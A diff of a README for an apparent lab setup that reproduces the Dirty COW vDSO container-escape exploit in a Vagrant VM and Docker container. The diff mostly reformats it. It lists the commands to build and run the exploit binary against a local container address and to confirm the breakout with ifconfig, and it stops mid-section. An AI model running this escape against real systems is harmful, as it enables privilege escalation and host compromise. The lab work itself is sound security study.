@@ -7,33 +7,22 @@ This exploit is from  https://github.com/gebl/dirtycow-docker-vdso.git'}
 This exploit is similar that dirtycow-docker-vdso_1 with exception no seperate user is created 
 
 To execute:
-``	vagrant up
-``
-
-
-``	vagrant putty
-``
+	vagrant up
+	vagrant putty
 
 Once inside the VM run to launch the Docker Container:
-``
 	sudo docker-compose run dirtycow /bin/bash" 
-``
 
 Inside the Docker container run:
-``
     cd /dirtycow-vdso
      make
      ./0xdeadbeef 172.18.0.2:1234" 
-``      
+      
 
 Wait a few minutes for the exploit to launch 
 
-Show the breakout of the container by running 
-
-``
-ifconfig
-``	
-
+Show the breakout of the container by running ifconfig
+	
 Succesful breakout should list
 
 	
